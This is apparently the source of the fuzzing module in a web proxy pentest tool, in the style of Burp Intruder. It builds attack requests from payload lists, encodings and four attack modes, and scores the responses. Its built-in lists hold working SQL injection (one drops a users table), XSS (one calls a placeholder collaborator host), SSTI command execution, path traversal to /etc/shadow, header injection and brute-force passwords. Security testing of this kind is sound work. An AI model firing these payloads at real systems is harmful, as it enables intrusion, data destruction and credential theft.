"""Intruder — position-based fuzzing engine with 4 attack types, payload processing, grep/match."""

from __future__ import annotations

import asyncio
import base64
import hashlib
import itertools
import logging
import re
import time
import uuid
from urllib.parse import quote, quote_plus
from html import escape as html_escape

import httpx

from models import (
    AttackType, GrepRule, IntruderJob, IntruderRequest, IntruderResult,
    IntruderPosition, PayloadProcessing, PayloadProcessingRule,
)
from state import state
from safe_regex import safe_search, safe_findall

log = logging.getLogger("proxy-engine.intruder")

_cancel_events: dict[str, asyncio.Event] = {}
_recursive_seen: dict[str, set] = {}  # job_id -> set of already-used extracted values


# ── Built-in payload lists ───────────────────────────────────────────────────

PAYLOADS = {
    "sqli": [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "1' ORDER BY 1--", "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "' AND 1=1--", "' AND 1=2--", "'; DROP TABLE users--",
        "1; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
        "admin'--", "' OR ''='", "') OR ('1'='1",
        "1 AND 1=1", "1 AND 1=2", "' HAVING 1=1--",
        "1' GROUP BY 1--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>", "javascript:alert(1)",
        "\"><script>alert(1)</script>", "'-alert(1)-'",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>", "{{7*7}}",
        "${7*7}", "<img src=x onerror=prompt(1)>",
        "'\"><img src=x onerror=alert(1)>",
        "<script>fetch('http://COLLAB')</script>",
        "<svg><script>alert(1)</script></svg>",
    ],
    "path_traversal": [
        "../../../etc/passwd", "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd", "C:\\Windows\\system.ini",
        "....\\....\\....\\windows\\system.ini",
        "/proc/self/environ", "/etc/shadow",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config}}", "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{% import os %}{{ os.popen('id').read() }}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%25+import+os+%25}{{os.popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "common_passwords": [
        "admin", "password", "123456", "password1", "admin123",
        "root", "toor", "letmein", "welcome", "monkey",
        "dragon", "master", "qwerty", "login", "abc123",
        "passw0rd", "shadow", "123456789", "password123", "test",
    ],
    "headers_inject": [
        "X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin", "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Forwarded-Host: evil.com", "X-Host: evil.com",
    ],
    "nosqli": [
        "true, $where: '1 == 1'", ", $where: '1 == 1'",
        "$gt", "[$ne]", "{$gt: ''}", "{$ne: null}",
        "'; return '' == '", "{$regex: '.*'}",
    ],
}


# ── Payload processing ──────────────────────────────────────────────────────

def _apply_processing(payload: str, rules: list[PayloadProcessingRule]) -> str:
    """Apply a chain of processing rules to a payload."""
    for rule in rules:
        match rule.operation:
            case PayloadProcessing.url_encode:
                payload = quote(payload, safe="")
            case PayloadProcessing.url_encode_all:
                payload = quote_plus(payload)
            case PayloadProcessing.double_url_encode:
                payload = quote(quote(payload, safe=""), safe="")
            case PayloadProcessing.triple_url_encode:
                payload = quote(quote(quote(payload, safe=""), safe=""), safe="")
            case PayloadProcessing.base64_encode:
                payload = base64.b64encode(payload.encode()).decode()
            case PayloadProcessing.base64_decode:
                try:
                    payload = base64.b64decode(payload + "==").decode(errors="replace")
                except Exception:
                    pass
            case PayloadProcessing.hex_encode:
                payload = payload.encode().hex()
            case PayloadProcessing.md5_hash:
                payload = hashlib.md5(payload.encode()).hexdigest()
            case PayloadProcessing.sha1_hash:
                payload = hashlib.sha1(payload.encode()).hexdigest()
            case PayloadProcessing.sha256_hash:
                payload = hashlib.sha256(payload.encode()).hexdigest()
            case PayloadProcessing.html_encode:
                payload = html_escape(payload)
            case PayloadProcessing.lowercase:
                payload = payload.lower()
            case PayloadProcessing.uppercase:
                payload = payload.upper()
            case PayloadProcessing.reverse:
                payload = payload[::-1]
            case PayloadProcessing.prefix:
                payload = rule.value + payload
            case PayloadProcessing.suffix:
                payload = payload + rule.value
            case PayloadProcessing.unicode_escape:
                payload = "".join(f"\\u{ord(c):04x}" for c in payload)
            case PayloadProcessing.jwt_sign:
                try:
                    import hmac as _hmac
                    secret = rule.value or "secret"
                    header_b64 = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
                    payload_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b"=").decode()
                    msg = f"{header_b64}.{payload_b64}"
                    sig = base64.urlsafe_b64encode(
                        _hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    payload = f"{msg}.{sig}"
                except Exception:
                    pass
            case PayloadProcessing.case_mutations:
                pass  # Handled in _apply_case_mutations below
    return payload


def _apply_case_mutations(payload: str) -> list[str]:
    """Generate case mutation variants of a payload."""
    variants = [
        payload.lower(),
        payload.upper(),
        payload.capitalize(),
        payload.swapcase(),
    ]
    # Alternating case
    alt = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    variants.append(alt)
    return list(dict.fromkeys(variants))  # dedupe


# ── Grep/match ──────────────────────────────────────────────────────────────

def _apply_grep_rules(
    rules: list[GrepRule],
    status_code: int,
    headers: dict[str, str],
    body: str,
) -> dict[str, bool]:
    """Apply grep rules and return {pattern: matched} dict."""
    results = {}
    for rule in rules:
        if rule.location == "status":
            text = str(status_code)
        elif rule.location == "headers":
            text = "\n".join(f"{k}: {v}" for k, v in headers.items())
        else:
            text = body

        matched = bool(safe_search(rule.pattern, text))

        if rule.negate:
            matched = not matched

        results[rule.pattern] = matched
    return results


# ── Payload generators (Task #21) ─────────────────────────────────────────

def generate_number_range(start: int, end: int, step: int = 1,
                          padding: int = 0, base: int = 10) -> list[str]:
    """Generate a range of numbers as payloads."""
    results = []
    for n in range(start, end + 1, step):
        if base == 16:
            s = hex(n)[2:]
        elif base == 8:
            s = oct(n)[2:]
        else:
            s = str(n)
        if padding > 0:
            s = s.zfill(padding)
        results.append(s)
    return results


def generate_dates(start_year: int = 2020, end_year: int = 2026,
                   formats: list[str] | None = None,
                   step: str = "day") -> list[str]:
    """Generate date strings as payloads.

    Supports step values: 'day', 'week', 'month'.
    Can be invoked with 'dates:2024-01-01:2024-12-31:day' syntax.
    """
    from datetime import date, timedelta
    fmts = formats or ["%Y-%m-%d", "%d/%m/%Y", "%m/%d/%Y", "%Y%m%d"]
    results = []
    d = date(start_year, 1, 1)
    end = date(end_year, 12, 31)
    step_delta = timedelta(days=1)
    if step == "week":
        step_delta = timedelta(weeks=1)
    elif step == "month":
        step_delta = timedelta(days=30)
    while d <= end:
        for fmt in fmts:
            results.append(d.strftime(fmt))
        d += step_delta
        if len(results) >= 500_000:
            break
    return results


def generate_formatted_numbers(start: int, end: int, step: int = 1,
                               fmt: str = "") -> list[str]:
    """Generate formatted number sequences.

    Format string uses Python format spec: %05d for zero-padded 5 digits, etc.
    Invoked with 'numbers:1:1000:1:%05d' syntax.
    """
    results = []
    for n in range(start, end + 1, step):
        if fmt:
            try:
                results.append(fmt % n)
            except (TypeError, ValueError):
                results.append(str(n))
        else:
            results.append(str(n))
        if len(results) >= 1_000_000:
            break
    return results


def generate_charset_bruteforce(charset: str, min_len: int = 1,
                                max_len: int = 3) -> list[str]:
    """Generate all combinations of characters from a charset."""
    results = []
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            results.append("".join(combo))
            if len(results) >= 100_000:
                return results
    return results


def generate_uuids(count: int = 100) -> list[str]:
    """Generate random UUIDs as payloads."""
    return [str(uuid.uuid4()) for _ in range(count)]


def generate_character_frobber(base: str) -> list[str]:
    """Flip each character in the base string one at a time (character frobbing)."""
    results = []
    for i, ch in enumerate(base):
        for offset in (1, -1, 32, -32):
            new_ord = ord(ch) + offset
            if 32 <= new_ord <= 126:
                results.append(base[:i] + chr(new_ord) + base[i + 1:])
    return results


def generate_bit_flipper(base: str) -> list[str]:
    """Flip each bit in the base string bytes."""
    results = []
    raw = base.encode("utf-8", errors="replace")
    for i in range(len(raw)):
        for bit in range(8):
            flipped = bytearray(raw)
            flipped[i] ^= 1 << bit
            try:
                results.append(flipped.decode("utf-8", errors="replace"))
            except Exception:
                pass
    return results


def generate_null_payloads(count: int = 10) -> list[str]:
    """Generate empty/null variant payloads."""
    variants = [
        "", " ", "\t", "\n", "\r\n", "\x00", "null", "None", "nil", "undefined",
        "0", "-1", "NaN", "Infinity", "true", "false", "[]", "{}", '""', "''",
    ]
    return variants[:count]


def generate_username_variants(name: str) -> list[str]:
    """Generate username variants from a base name."""
    results = [name]
    results.append(name.lower())
    results.append(name.upper())
    results.append(name.capitalize())
    for sep in [".", "_", "-"]:
        if len(name) > 3:
            mid = len(name) // 2
            results.append(name[:mid] + sep + name[mid:])
    for suffix in ["1", "123", "2024", "2025", "2026", "admin", "test", "_dev", ".bak"]:
        results.append(name + suffix)
    for prefix in ["admin_", "test_", "dev_", "old_"]:
        results.append(prefix + name)
    return list(dict.fromkeys(results))  # dedupe preserving order


# ── Smart default payloads per param type ────────────────────────────────────

_SMART_PAYLOADS: dict[str, list[str]] = {
    "url_param": ["@sqli", "@xss"],
    "body_param": ["@sqli", "@xss"],
    "json_key": ["@sqli", "@xss", "@ssti"],
    "cookie": ["@sqli", "@xss"],
    "header": ["@headers_inject", "@xss"],
    "url_path": ["@path_traversal", "@sqli"],
    "xml_node": ["@xss", "@sqli"],
    "multipart_field": ["@xss", "@sqli"],
}


# ── Attack from flow ────────────────────────────────────────────────────────

async def attack_from_flow(
    flow_id: str,
    attack_type: str = "sniper",
    payloads: list[list[str]] | None = None,
    concurrency: int = 10,
    grep_rules: list[GrepRule] | None = None,
) -> IntruderJob:
    """Send a captured flow to Intruder with auto-populated positions from insertion points."""
    from insertion_points import extract_from_flow

    flow = state.get_flow(flow_id)
    if not flow:
        raise ValueError(f"Flow {flow_id} not found")

    flow_dict = flow.model_dump()
    parsed = extract_from_flow(flow_dict)

    if not parsed.insertion_points:
        raise ValueError("No insertion points found in flow")

    # Convert insertion points to IntruderPositions
    positions: list[IntruderPosition] = []
    resolved_payloads: list[list[str]] = []

    for ip in parsed.insertion_points:
        # Map insertion point to intruder position
        if ip.location == "url_param":
            # Find the param in the URL query string
            from urllib.parse import urlparse, parse_qs
            qs = urlparse(parsed.url).query
            idx = qs.find(f"{ip.name}=")
            if idx >= 0:
                val_start = idx + len(ip.name) + 1
                val_end = val_start + len(ip.value)
                positions.append(IntruderPosition(field="url", start=parsed.url.find("?") + 1 + val_start, end=parsed.url.find("?") + 1 + val_end))
            else:
                continue
        elif ip.location == "body_param":
            body = parsed.body or ""
            idx = body.find(f"{ip.name}=")
            if idx >= 0:
                val_start = idx + len(ip.name) + 1
                val_end = val_start + len(ip.value)
                positions.append(IntruderPosition(field="body", start=val_start, end=val_end))
            else:
                continue
        elif ip.location == "cookie":
            cookie_val = parsed.headers.get("Cookie", parsed.headers.get("cookie", ""))
            idx = cookie_val.find(f"{ip.name}=")
            if idx >= 0:
                val_start = idx + len(ip.name) + 1
                val_end = val_start + len(ip.value)
                positions.append(IntruderPosition(field="header:Cookie", start=val_start, end=val_end))
            else:
                continue
        elif ip.location == "header":
            hdr_val = parsed.headers.get(ip.name, "")
            positions.append(IntruderPosition(field=f"header:{ip.name}", start=0, end=len(hdr_val)))
        else:
            continue

        # Assign smart default payloads if none provided
        if payloads is None:
            smart = _SMART_PAYLOADS.get(ip.location, ["@xss", "@sqli"])
            resolved_payloads.append(smart)

    if not positions:
        raise ValueError("Could not map any insertion points to intruder positions")

    final_payloads = payloads if payloads is not None else resolved_payloads

    # For sniper/battering_ram, only need one payload list
    if attack_type in ("sniper", "battering_ram") and len(final_payloads) > 1:
        # Merge all payload lists for sniper
        merged: list[str] = []
        for pl in final_payloads:
            merged.extend(pl)
        final_payloads = [list(dict.fromkeys(merged))]

    req = IntruderRequest(
        method=parsed.method,
        url=parsed.url,
        headers=parsed.headers,
        body=parsed.body,
        positions=positions,
        payloads=final_payloads,
        attack_type=AttackType(attack_type),
        concurrency=concurrency,
        grep_rules=grep_rules or [],
    )

    return await start_attack(req)


# ── Attack generation ────────────────────────────────────────────────────────

def _get_field_value(req: IntruderRequest, pos: IntruderPosition) -> str:
    if pos.field == "url":
        return req.url
    elif pos.field == "body":
        return req.body or ""
    elif pos.field.startswith("header:"):
        header_name = pos.field.split(":", 1)[1]
        return req.headers.get(header_name, "")
    return ""


def _set_field_value(req: IntruderRequest, pos: IntruderPosition, value: str, payload: str) -> dict:
    original = value
    modified = original[:pos.start] + payload + original[pos.end:]
    result = {
        "method": req.method,
        "url": req.url,
        "headers": dict(req.headers),
        "body": req.body,
    }
    if pos.field == "url":
        result["url"] = modified
    elif pos.field == "body":
        result["body"] = modified
    elif pos.field.startswith("header:"):
        header_name = pos.field.split(":", 1)[1]
        result["headers"][header_name] = modified
    return result


def _resolve_payloads(payload_list: list[str]) -> list[str]:
    result = []
    for p in payload_list:
        if p.startswith("@") and p[1:] in PAYLOADS:
            result.extend(PAYLOADS[p[1:]])
        elif p.startswith("file:"):
            from pathlib import Path
            path = Path(p[5:])
            if path.exists():
                lines = [l.strip() for l in path.read_text(errors="replace").splitlines()
                         if l.strip() and not l.startswith("#")]
                result.extend(lines)
                log.info(f"[intruder] Loaded {len(lines)} payloads from {path}")
            else:
                log.warning(f"[intruder] Wordlist not found: {path}")
        elif p.startswith("range:"):
            # range:1-100 or range:1-100:2 or range:1-100:1:5 (padded to 5 digits)
            parts = p[6:].split(":")
            try:
                bounds = parts[0].split("-")
                start, end = int(bounds[0]), int(bounds[1])
                step = int(parts[1]) if len(parts) > 1 else 1
                padding = int(parts[2]) if len(parts) > 2 else 0
                result.extend(generate_number_range(start, end, step, padding))
            except (ValueError, IndexError):
                log.warning(f"[intruder] Invalid range: {p}")
        elif p.startswith("uuid:"):
            try:
                count = int(p[5:])
                result.extend(generate_uuids(min(count, 10000)))
            except ValueError:
                result.extend(generate_uuids(100))
        elif p.startswith("charset:"):
            # charset:abc:1:3  — chars, min_len, max_len
            parts = p[8:].split(":")
            charset = parts[0] if parts else "0123456789"
            min_l = int(parts[1]) if len(parts) > 1 else 1
            max_l = int(parts[2]) if len(parts) > 2 else 3
            result.extend(generate_charset_bruteforce(charset, min_l, max_l))
        elif p.startswith("frobber:"):
            base_str = p[8:]
            result.extend(generate_character_frobber(base_str))
        elif p.startswith("bitflip:"):
            base_str = p[8:]
            result.extend(generate_bit_flipper(base_str)[:1000])
        elif p.startswith("null:"):
            try:
                cnt = int(p[5:])
            except ValueError:
                cnt = 10
            result.extend(generate_null_payloads(cnt))
        elif p.startswith("usernames:"):
            base_name = p[10:]
            result.extend(generate_username_variants(base_name))
        elif p.startswith("dates:"):
            # dates:2024-01-01:2024-12-31:day
            parts = p[6:].split(":")
            try:
                from datetime import datetime
                start_dt = datetime.strptime(parts[0], "%Y-%m-%d")
                end_dt = datetime.strptime(parts[1], "%Y-%m-%d") if len(parts) > 1 else start_dt.replace(year=start_dt.year + 1)
                step = parts[2] if len(parts) > 2 else "day"
                result.extend(generate_dates(start_dt.year, end_dt.year, step=step))
            except (ValueError, IndexError):
                log.warning(f"[intruder] Invalid dates spec: {p}")
        elif p.startswith("numbers:"):
            # numbers:1:1000:1:%05d
            parts = p[8:].split(":")
            try:
                start = int(parts[0])
                end_n = int(parts[1]) if len(parts) > 1 else start + 100
                step = int(parts[2]) if len(parts) > 2 else 1
                fmt = parts[3] if len(parts) > 3 else ""
                result.extend(generate_formatted_numbers(start, end_n, step, fmt))
            except (ValueError, IndexError):
                log.warning(f"[intruder] Invalid numbers spec: {p}")
        elif p.startswith("case:"):
            base_payload = p[5:]
            result.extend(_apply_case_mutations(base_payload))
        else:
            result.append(p)
    return result


def generate_attack_configs(req: IntruderRequest) -> list[tuple[dict, str | list[str]]]:
    resolved = [_resolve_payloads(pl) for pl in req.payloads]

    # Apply payload processing
    if req.payload_processing:
        resolved = [
            [_apply_processing(p, req.payload_processing) for p in pl]
            for pl in resolved
        ]

    configs = []

    if req.attack_type == AttackType.sniper:
        # Sniper: iterate each position independently using the FIRST payload list
        payload_list = resolved[0] if resolved else []
        for pos in req.positions:
            base_value = _get_field_value(req, pos)
            for payload in payload_list:
                modified = _set_field_value(req, pos, base_value, payload)
                configs.append((modified, payload))

    elif req.attack_type == AttackType.battering_ram:
        payload_list = resolved[0]
        for payload in payload_list:
            modified = {"method": req.method, "url": req.url, "headers": dict(req.headers), "body": req.body}
            for pos in req.positions:
                base_value = _get_field_value(req, pos)
                temp = _set_field_value(req, pos, base_value, payload)
                modified.update(temp)
            configs.append((modified, payload))

    elif req.attack_type == AttackType.pitchfork:
        # Pitchfork: one payload list per position, iterate in lockstep
        if len(resolved) < len(req.positions):
            log.warning("[intruder] Pitchfork: fewer payload lists than positions, padding with last list")
            while len(resolved) < len(req.positions):
                resolved.append(resolved[-1] if resolved else [])
        min_len = min(len(pl) for pl in resolved[:len(req.positions)])
        for idx in range(min_len):
            modified = {"method": req.method, "url": req.url, "headers": dict(req.headers), "body": req.body}
            payloads_used = []
            for i, pos in enumerate(req.positions):
                payload = resolved[i][idx]
                base_value = _get_field_value(req, pos)
                temp = _set_field_value(req, pos, base_value, payload)
                modified.update(temp)
                payloads_used.append(payload)
            configs.append((modified, payloads_used))

    elif req.attack_type == AttackType.cluster_bomb:
        # Guard against combinatorial explosion
        total_combos = 1
        for pl in resolved:
            total_combos *= max(len(pl), 1)
        MAX_CLUSTER_BOMB = 100_000
        if total_combos > MAX_CLUSTER_BOMB:
            log.error(f"[intruder] Cluster bomb would generate {total_combos} requests (max {MAX_CLUSTER_BOMB})")
            raise ValueError(f"Cluster bomb would generate {total_combos} requests, max allowed is {MAX_CLUSTER_BOMB}")
        for combo in itertools.product(*resolved):
            modified = {"method": req.method, "url": req.url, "headers": dict(req.headers), "body": req.body}
            for i, pos in enumerate(req.positions):
                base_value = _get_field_value(req, pos)
                temp = _set_field_value(req, pos, base_value, combo[i])
                modified.update(temp)
            configs.append((modified, list(combo)))

    return configs


# ── Execution ────────────────────────────────────────────────────────────────

async def _execute_single(
    client: httpx.AsyncClient,
    config: dict,
    payload: str | list[str],
    index: int,
    timeout: float,
    follow_redirects: bool,
    grep_rules: list[GrepRule],
) -> IntruderResult:
    start = time.monotonic()
    try:
        response = await client.request(
            method=config["method"],
            url=config["url"],
            headers=config.get("headers", {}),
            content=config["body"].encode("utf-8") if config.get("body") else None,
            follow_redirects=follow_redirects,
        )
        duration = (time.monotonic() - start) * 1000
        body_text = response.text

        grep_matches = {}
        if grep_rules:
            grep_matches = _apply_grep_rules(
                grep_rules, response.status_code, dict(response.headers), body_text,
            )

        return IntruderResult(
            index=index,
            payload=payload,
            status_code=response.status_code,
            length=len(body_text),
            duration_ms=round(duration, 2),
            headers=dict(response.headers),
            body_preview=body_text[:500],
            grep_matches=grep_matches,
        )
    except Exception as e:
        duration = (time.monotonic() - start) * 1000
        return IntruderResult(
            index=index,
            payload=payload,
            status_code=0,
            length=0,
            duration_ms=round(duration, 2),
            error=str(e),
        )


async def _run_attack(job: IntruderJob, req: IntruderRequest, configs: list) -> None:
    cancel_event = _cancel_events.get(job.job_id)
    sem = asyncio.Semaphore(req.concurrency)

    async with httpx.AsyncClient(verify=False, timeout=req.timeout) as client:

        async def worker(idx: int, config: dict, payload):
            if cancel_event and cancel_event.is_set():
                return
            async with sem:
                if cancel_event and cancel_event.is_set():
                    return
                # Rate limiting delay
                if req.delay_ms > 0:
                    await asyncio.sleep(req.delay_ms / 1000.0)
                result = await _execute_single(
                    client, config, payload, idx, req.timeout,
                    req.follow_redirects, req.grep_rules,
                )
                job.results.append(result)
                job.completed += 1

                # Recursive grep: extract from response and queue new requests
                if req.recursive_grep and result.body_preview:
                    try:
                        matches = safe_findall(req.recursive_grep, result.body_preview)
                        for match in matches[:10]:  # limit to 10 extractions per response
                            if match and match not in _recursive_seen.get(job.job_id, set()):
                                _recursive_seen.setdefault(job.job_id, set()).add(match)
                                # Queue new request with extracted value
                                for pos in req.positions:
                                    base_val = _get_field_value(req, pos)
                                    new_cfg = _set_field_value(req, pos, base_val, match)
                                    job.total += 1
                                    asyncio.create_task(worker(job.total - 1, new_cfg, match))
                    except Exception:
                        pass

        tasks = [
            asyncio.create_task(worker(i, cfg, pl))
            for i, (cfg, pl) in enumerate(configs)
        ]

        await asyncio.gather(*tasks, return_exceptions=True)

    if cancel_event and cancel_event.is_set():
        job.status = "cancelled"
    else:
        job.status = "completed"

    job.results.sort(key=lambda r: r.index)
    _cancel_events.pop(job.job_id, None)


async def start_attack(req: IntruderRequest) -> IntruderJob:
    configs = generate_attack_configs(req)

    job_id = str(uuid.uuid4())[:8]
    job = IntruderJob(
        job_id=job_id,
        attack_type=req.attack_type,
        total=len(configs),
        grep_rules=req.grep_rules,
    )
    state.intruder_jobs[job_id] = job

    cancel_event = asyncio.Event()
    _cancel_events[job_id] = cancel_event

    log.info(f"[intruder] Starting {req.attack_type.value} attack: {len(configs)} requests")
    asyncio.create_task(_run_attack(job, req, configs))
    return job


def cancel_attack(job_id: str) -> bool:
    if job_id not in state.intruder_jobs:
        return False
    event = _cancel_events.get(job_id)
    if event:
        event.set()
    state.intruder_jobs[job_id].status = "cancelled"
    return True


# ── Resource pools (Phase 4A) ────────────────────────────────────────────────

_resource_pools: dict[str, "ResourcePool"] = {}
_pool_semaphores: dict[str, asyncio.Semaphore] = {}

def get_pool_semaphore(pool_name: str) -> asyncio.Semaphore:
    """Get or create a semaphore for a resource pool."""
    if pool_name not in _pool_semaphores:
        from models import ResourcePool
        pool = state.resource_pools.get(pool_name, ResourcePool(name=pool_name))
        _pool_semaphores[pool_name] = asyncio.Semaphore(pool.max_concurrent_requests)
    return _pool_semaphores[pool_name]


# ── Adaptive throttling (Phase 4B) ──────────────────────────────────────────

class _AdaptiveThrottle:
    def __init__(self, base_delay_ms: int = 0):
        self.delay_ms = base_delay_ms
        self.consecutive_errors = 0
        self.max_delay_ms = 30000

    def on_response(self, status: int) -> None:
        if status in (429, 503):
            self.delay_ms = min(self.delay_ms * 2 + 500, self.max_delay_ms)
            self.consecutive_errors += 1
        elif status < 500:
            self.delay_ms = max(self.delay_ms // 2, 0)
            self.consecutive_errors = 0

    async def wait(self) -> None:
        if self.delay_ms > 0:
            await asyncio.sleep(self.delay_ms / 1000)


# ── Response clustering (Phase 4C) ──────────────────────────────────────────

def cluster_results(job: IntruderJob, threshold: float = 0.85) -> dict:
    """Group results by status_code + length bucket + body hash."""
    clusters: dict[str, list[int]] = {}

    for r in job.results:
        if r.error:
            continue
        length_bucket = (r.length // 100) * 100
        body_hash = hashlib.md5(r.body_preview.encode()).hexdigest()[:8] if r.body_preview else "empty"
        key = f"{r.status_code}|{length_bucket}|{body_hash}"
        clusters.setdefault(key, []).append(r.index)

    # Assign cluster IDs and identify anomalies
    cluster_id = 0
    cluster_list = []
    anomalies = []

    # Sort by size: largest cluster first
    sorted_clusters = sorted(clusters.items(), key=lambda x: len(x[1]), reverse=True)
    avg_size = len(job.results) / max(len(sorted_clusters), 1)

    for key, indices in sorted_clusters:
        cluster_id += 1
        for idx in indices:
            for r in job.results:
                if r.index == idx:
                    r.cluster_id = cluster_id
                    break

        is_anomaly = len(indices) <= max(1, avg_size * 0.1)
        cluster_list.append({
            "cluster_id": cluster_id,
            "key": key,
            "count": len(indices),
            "indices": indices[:20],
            "is_anomaly": is_anomaly,
        })

        if is_anomaly:
            for idx in indices:
                anomalies.append(idx)
                for r in job.results:
                    if r.index == idx:
                        r.is_anomaly = True
                        break

    return {"clusters": cluster_list, "anomalies": anomalies, "total_clusters": len(cluster_list)}


# ── Timing analysis (Phase 4D) ──────────────────────────────────────────────

def analyze_timing(job: IntruderJob, threshold_multiplier: float = 3.0) -> dict:
    """Compute timing statistics and flag anomalies."""
    import statistics as stats_mod

    durations = [r.duration_ms for r in job.results if not r.error and r.duration_ms > 0]
    if len(durations) < 2:
        return {"error": "Not enough data points"}

    durations_sorted = sorted(durations)
    n = len(durations_sorted)

    timing_stats = {
        "min": round(min(durations), 2),
        "max": round(max(durations), 2),
        "avg": round(stats_mod.mean(durations), 2),
        "median": round(stats_mod.median(durations), 2),
        "p50": round(durations_sorted[n // 2], 2),
        "p95": round(durations_sorted[int(n * 0.95)], 2),
        "p99": round(durations_sorted[int(n * 0.99)], 2),
        "std_dev": round(stats_mod.stdev(durations), 2),
        "count": n,
    }

    # Flag anomalies
    mean = timing_stats["avg"]
    std = timing_stats["std_dev"]
    threshold = mean + threshold_multiplier * std

    anomaly_indices = []
    for r in job.results:
        if not r.error and r.duration_ms > threshold:
            anomaly_indices.append(r.index)

    job.timing_stats = timing_stats
    job.timing_anomalies = anomaly_indices

    return {
        "stats": timing_stats,
        "threshold": round(threshold, 2),
        "anomalies": anomaly_indices,
        "anomaly_count": len(anomaly_indices),
    }


# ── Attack export (Phase 4E) ────────────────────────────────────────────────

def export_results(job: IntruderJob, format: str = "csv") -> str:
    """Export intruder results as CSV or JSON."""
    if format == "json":
        import json as _json
        return _json.dumps([r.model_dump() for r in job.results], indent=2)

    # CSV format
    import csv as _csv
    import io
    output = io.StringIO()
    writer = _csv.writer(output)
    writer.writerow(["index", "payload", "status_code", "length", "duration_ms", "grep_matches", "cluster_id", "is_anomaly"])
    for r in job.results:
        payload_str = r.payload if isinstance(r.payload, str) else "|".join(r.payload)
        grep_str = ";".join(f"{k}={v}" for k, v in r.grep_matches.items()) if r.grep_matches else ""
        writer.writerow([r.index, payload_str, r.status_code, r.length, r.duration_ms, grep_str, r.cluster_id, r.is_anomaly])
    return output.getvalue()
